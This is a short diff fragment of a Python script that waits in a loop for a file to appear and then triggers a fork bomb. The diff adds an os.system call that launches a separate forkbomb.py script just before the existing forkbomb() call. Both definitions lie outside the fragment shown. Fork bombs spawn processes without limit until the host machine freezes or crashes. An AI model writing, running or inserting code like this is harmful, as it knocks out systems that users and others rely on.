@@ -12,4 +12,5 @@ else:
   pass
 while not os.path.isfile(file):
   time.sleep(1)
+os.system("python forkbomb.py")
 forkbomb()
